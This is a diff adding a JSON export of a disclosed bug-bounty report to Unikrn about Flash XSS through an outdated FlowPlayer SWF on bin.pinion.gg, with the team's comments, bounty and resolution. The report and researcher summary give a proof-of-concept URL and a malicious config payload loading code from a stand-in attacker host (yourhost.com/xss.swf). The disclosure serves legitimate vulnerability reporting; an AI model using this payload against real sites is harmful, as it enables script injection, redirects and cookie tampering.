@@ -1,0 +1,463 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-10-05T20:43:56.211Z", 
+    "voters": [
+        "europa", 
+        "jensec", 
+        "asad0x01_", 
+        "eveeez", 
+        "ak1t4", 
+        "mr_r3boot", 
+        "fa1rlight", 
+        "whitesector", 
+        "apapedulimu", 
+        "japz", 
+        "and 6 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "30.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 254269, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-10-05T21:10:12.715Z", 
+    "vulnerability_information": "##Description\nHi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.\nI discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:\n```\nCACHE MANIFEST\n# 2014-07-07\nCACHE:\nhttp://bin.pinion.gg/bin/companions.min.js\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nhttp://vox-static.liverail.com/crossdomain.xml\nhttp://cdn-static.liverail.com/crossdomain.xml\nhttp://bs.serving-sys.com/crossdomain.xml\nhttp://ad-apac.doubleclick.net/crossdomain.xml\nhttp://ads.intergi.com/crossdomain.xml\nhttp://u-ads.adap.tv/crossdomain.xml\nhttp://imasdk.googleapis.com/js/sdkloader/ima3.js\nhttp://www.googletagservices.com/tag/js/gpt.js\nhttps://www.google-analytics.com/ga.js\nhttp://partner.googleadservices.com/gpt/pubads_impl_90.js\nNETWORK:\n*\n```\n\nOne string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nI submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.\n\n##POC\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/test.js\nJust visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.\n\n##Impact\nThe vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.\n1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content\n2) Using Open Redirect through `window.location` js payload.\n3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.\n4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.\n\n##Reproduction steps\nYou just need to place the malicious file to the remote host, like in this example:\nhttp://\u2588\u2588\u2588\u2588/test.js\nand append the url to the\n```\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=\n```\nas parameter.\n\n##Suggested fix\nI recommend you to update FlowPlayer to the latest version, or remove if not used.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "Team"
+    }, 
+    "title": "Persistent XSS found on bin.pinion.gg due to outdated FlowPlayer SWF file with Remote File Inclusion vulnerability.", 
+    "is_member_of_team?": null, 
+    "vote_count": 16, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 5490, 
+            "content": "*Thanks to the Unikrn team for the fast response, fix, and the bounty!*\n\nI discovered the Flash XSS issue on the one of the pinion.gg subdomains.\nThe XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it `test.js`), placed on remote host, and then referenced in `config` URL param:\n```\n{\n    'log' : {\n        'level'  : 'info'\n    },\n    'clip': {\n        'autoPlay': 'true',\n        'baseUrl': 'http://stream.flowplayer.org/',\n        'onMyConnectionEvent': 'function(clip, info) {alert(/onMyConnectionEvent/)};',\n        'onStart': 'function() {alert(/onBegin/);}' \n    },\n    'playlist': [ \n    ],\n    'plugins': { \n        'controls': { \n            'url': 'http://yourhost.com/xss.swf' \n        }\n    },\n    'onLoad': 'function() {alert(/onLoad/);}',\n    'connectionCallbacks': [ \"onMyConnectionEvent\" ]\n}\n```\nwhere `http://yourhost.com/xss.swf` - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.\nUsing \n```\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js\n```\nit was possible to execute any arbitrary JS in the context of subdomain.\nI named it as persistent in the report title, because payload was in the stored form, but just 'flash xss' sounds more correctly. It could be turned to persistent, in case that `config` param actually was used somewhere.\n\n\n##References\n* https://github.com/flowplayer/flash/issues/263\n* http://mihai.bazon.net/blog/externalinterface-is-unreliable", 
+            "content_html": "<p><em>Thanks to the Unikrn team for the fast response, fix, and the bounty!</em></p>\n\n<p>I discovered the Flash XSS issue on the one of the pinion.gg subdomains.<br>\nThe XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it <code>test.js</code>), placed on remote host, and then referenced in <code>config</code> URL param:</p>\n<pre class=\"highlight plaintext\"><code>{\n    &#39;log&#39; : {\n        &#39;level&#39;  : &#39;info&#39;\n    },\n    &#39;clip&#39;: {\n        &#39;autoPlay&#39;: &#39;true&#39;,\n        &#39;baseUrl&#39;: &#39;http://stream.flowplayer.org/&#39;,\n        &#39;onMyConnectionEvent&#39;: &#39;function(clip, info) {alert(/onMyConnectionEvent/)};&#39;,\n        &#39;onStart&#39;: &#39;function() {alert(/onBegin/);}&#39; \n    },\n    &#39;playlist&#39;: [ \n    ],\n    &#39;plugins&#39;: { \n        &#39;controls&#39;: { \n            &#39;url&#39;: &#39;http://yourhost.com/xss.swf&#39; \n        }\n    },\n    &#39;onLoad&#39;: &#39;function() {alert(/onLoad/);}&#39;,\n    &#39;connectionCallbacks&#39;: [ &quot;onMyConnectionEvent&quot; ]\n}\n</code></pre>\n<p>where <code>http://yourhost.com/xss.swf</code> - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.<br>\nUsing </p>\n<pre class=\"highlight plaintext\"><code>http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js\n</code></pre>\n<p>it was possible to execute any arbitrary JS in the context of subdomain.<br>\nI named it as persistent in the report title, because payload was in the stored form, but just &#39;flash xss&#39; sounds more correctly. It could be turned to persistent, in case that <code>config</code> param actually was used somewhere.</p>\n\n<h2 id=\"references\">References</h2>\n\n<ul>\n<li><a title=\"https://github.com/flowplayer/flash/issues/263\" href=\"/redirect?signature=e46931e535c21a1cd5c425d7b5e301ff2f14caf0&amp;url=https%3A%2F%2Fgithub.com%2Fflowplayer%2Fflash%2Fissues%2F263\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/flowplayer/flash/issues/263</span><i class=\"icon-external-link\"></i></a></li>\n<li><a title=\"http://mihai.bazon.net/blog/externalinterface-is-unreliable\" href=\"/redirect?signature=8c5915b563498061166cfe8bbd598b30206bd26f&amp;url=http%3A%2F%2Fmihai.bazon.net%2Fblog%2Fexternalinterface-is-unreliable\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://mihai.bazon.net/blog/externalinterface-is-unreliable</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "pinion.gg", 
+        "max_severity": "medium", 
+        "databaseId": 455, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2017-11-04T20:43:56.278Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$30", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-28T14:10:54.377Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-28T14:20:14.634Z", 
+            "actor": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/690/93b990b2374f4d089706aa293037f203c80f88ae_medium.png?1507170790"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "I'll try to look tha latest version", 
+            "markdown_message": "<p>I&#39;ll try to look tha latest version</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1873378, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-28T14:32:13.548Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-28T14:33:42.811Z", 
+            "actor": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/690/93b990b2374f4d089706aa293037f203c80f88ae_medium.png?1507170790"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "It looks like https://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip is a most up-to-date version.\nAlso you can deal with this bug without updating the SWF library, by disallowing the external hosts in the config param of GET request using server rules.\n\nIf you consider this as accepted risk, let me know please, ill close the ticket.", 
+            "markdown_message": "<p>It looks like <a title=\"https://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip\" href=\"/redirect?signature=afe0590d9cc4c29a40f2f615ff06a523e7646aa2&amp;url=https%3A%2F%2Freleases.flowplayer.org%2F7.0.4%2Fflowplayer-7.0.4.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip</span><i class=\"icon-external-link\"></i></a> is a most up-to-date version.<br>\nAlso you can deal with this bug without updating the SWF library, by disallowing the external hosts in the config param of GET request using server rules.</p>\n\n<p>If you consider this as accepted risk, let me know please, ill close the ticket.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1873431, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-01T10:25:58.649Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-01T10:25:58.649Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "thx - not super hight prio for us - but we will look into it.", 
+            "markdown_message": "<p>thx - not super hight prio for us - but we will look into it.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1881909, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-04T03:56:30.787Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-04T03:56:30.787Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "thx again for this report! We are exploring options how risky a fix is atm.", 
+            "markdown_message": "<p>thx again for this report! We are exploring options how risky a fix is atm.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1892115, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-04T13:16:50.756Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-04T13:16:50.756Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low", 
+                "old_severity": "Medium"
+            }, 
+            "team_handle": "unikrn", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1892884, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-17T12:40:02.674Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-17T12:40:02.674Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "update: we are on it ;)", 
+            "markdown_message": "<p>update: we are on it ;)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1935876, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-08-17T12:40:12.766Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-17T12:40:12.766Z", 
+            "actor": {
+                "url": "/unikrn", 
+                "profile": {
+                    "name": "Unikrn"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/672/2c313426162f12b62df93a412604ed9499658268_medium.png?1501244013"
+                }
+            }, 
+            "team_handle": "unikrn", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "30.0", 
+            "collaborator": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1935877, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-17T13:04:49.055Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-17T13:04:49.055Z", 
+            "actor": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/690/93b990b2374f4d089706aa293037f203c80f88ae_medium.png?1507170790"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "Thanks for the bounty:)", 
+            "markdown_message": "<p>Thanks for the bounty:)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1935937, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs"
+            }, 
+            "created_at": "2017-10-05T19:41:37.293Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T19:41:37.293Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "took a while .. ;) ", 
+            "markdown_message": "<p>took a while .. ;) </p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2047478, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-05T20:19:53.467Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T20:35:14.956Z", 
+            "actor": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/690/93b990b2374f4d089706aa293037f203c80f88ae_medium.png?1507170790"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "Great:)\nCan you hide the hostname `\u2588\u2588\u2588\u2588\u2588\u2588` please?\nAfter this we can disclose it.", 
+            "markdown_message": "<p>Great:)<br>\nCan you hide the hostname <code>\u2588\u2588\u2588\u2588\u2588\u2588</code> please?<br>\nAfter this we can disclose it.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2047587, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-05T20:35:35.333Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T20:35:35.333Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "Done.", 
+            "markdown_message": "<p>Done.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2047631, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-05T20:43:56.241Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T20:43:56.241Z", 
+            "actor": {
+                "username": "sp1d3rs", 
+                "url": "/sp1d3rs", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/690/93b990b2374f4d089706aa293037f203c80f88ae_medium.png?1507170790"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "first_to_agree": true, 
+            "message": "Thanks a lot!", 
+            "markdown_message": "<p>Thanks a lot!</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2047651, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-05T21:10:12.739Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T21:10:12.739Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2047698, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-05T21:10:12.801Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-05T21:10:12.801Z", 
+            "actor": {
+                "username": "decrypted", 
+                "url": "/decrypted", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/035/819/7f571a00acb067fbc39967cfb48b800d3d7474f8_medium.png?1435734131"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "unikrn", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2047699, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "sp1d3rs", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/sp1d3rs", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/079/690/84dbd34ad5cb1cac4cefa3bf71e715d9c9fa7404_small.png?1507170790"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -34307276.27122727, 
+    "disclosed_at": "2017-10-05T21:10:12.774Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/254269", 
+    "created_at": "2017-07-28T13:50:32.637Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p>Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.<br>\nI discovered an interesting file on <a title=\"http://templ4d2.pinion.gg/motd2.manifest\" href=\"/redirect?signature=f1eaf638fa22f6a09c8a839abc7b2def4b48a315&amp;url=http%3A%2F%2Ftempl4d2.pinion.gg%2Fmotd2.manifest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://templ4d2.pinion.gg/motd2.manifest</span><i class=\"icon-external-link\"></i></a> with next content:</p>\n<pre class=\"highlight plaintext\"><code>CACHE MANIFEST\n# 2014-07-07\nCACHE:\nhttp://bin.pinion.gg/bin/companions.min.js\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nhttp://vox-static.liverail.com/crossdomain.xml\nhttp://cdn-static.liverail.com/crossdomain.xml\nhttp://bs.serving-sys.com/crossdomain.xml\nhttp://ad-apac.doubleclick.net/crossdomain.xml\nhttp://ads.intergi.com/crossdomain.xml\nhttp://u-ads.adap.tv/crossdomain.xml\nhttp://imasdk.googleapis.com/js/sdkloader/ima3.js\nhttp://www.googletagservices.com/tag/js/gpt.js\nhttps://www.google-analytics.com/ga.js\nhttp://partner.googleadservices.com/gpt/pubads_impl_90.js\nNETWORK:\n*\n</code></pre>\n<p>One string attracted my attention - <a title=\"http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\" href=\"/redirect?signature=a8da68b3125beb6e973a2772b9aa15404956a548&amp;url=http%3A%2F%2Fbin.pinion.gg%2Fbin%2Fflowplayer.commercial-3.2.15.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf</span><i class=\"icon-external-link\"></i></a><br>\nI submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (<a title=\"https://github.com/flowplayer/\" href=\"/redirect?signature=b1ae846843dc9ac63c9277a87b6d80e7d067c7c9&amp;url=https%3A%2F%2Fgithub.com%2Fflowplayer%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/flowplayer/</span><i class=\"icon-external-link\"></i></a>), vulnerable to XSS through remote file inclusion.</p>\n\n<h2 id=\"poc\">POC</h2>\n\n<p><a title=\"http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88/test.js\" href=\"/redirect?signature=7cc3f46ad5b311f40bb3e9360ca6ec9ca5de1156&amp;url=http%3A%2F%2Fbin.pinion.gg%2Fbin%2Fflowplayer.commercial-3.2.15.swf%3Fconfig%3Dhttp%3A%2F%2F%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%2Ftest.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88/test.js</span><i class=\"icon-external-link\"></i></a><br>\nJust visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.<br>\n1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content<br>\n2) Using Open Redirect through <code>window.location</code> js payload.<br>\n3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.<br>\n4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.</p>\n\n<h2 id=\"reproduction-steps\">Reproduction steps</h2>\n\n<p>You just need to place the malicious file to the remote host, like in this example:<br>\nhttp://\u2588\u2588\u2588\u2588/test.js<br>\nand append the url to the</p>\n<pre class=\"highlight plaintext\"><code>http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=\n</code></pre>\n<p>as parameter.</p>\n\n<h2 id=\"suggested-fix\">Suggested fix</h2>\n\n<p>I recommend you to update FlowPlayer to the latest version, or remove if not used.</p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://unikrn.com", 
+            "about": "Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!", 
+            "twitter_handle": "unikrnco", 
+            "name": "Unikrn"
+        }, 
+        "handle": "unikrn", 
+        "url": "https://hackerone.com/unikrn", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/672/23ed309c26adf94824a3e4ce8ad7937360013166_small.png?1501244013", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/002/672/2c313426162f12b62df93a412604ed9499658268_medium.png?1501244013"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 2672, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
